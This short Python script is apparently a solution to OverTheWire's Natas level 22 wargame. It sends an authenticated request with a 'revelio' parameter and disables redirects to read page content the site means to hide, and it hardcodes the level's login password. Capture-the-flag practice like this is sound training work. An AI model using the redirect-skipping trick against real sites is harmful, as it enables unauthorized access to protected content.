# Overthewire: Natas 22
# woanmeo11

import requests


url = 'http://natas22.natas.labs.overthewire.org'
auth = ('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')
r = requests.get(url, auth=auth, params={'revelio': ''}, allow_redirects=False)
print(r.text)
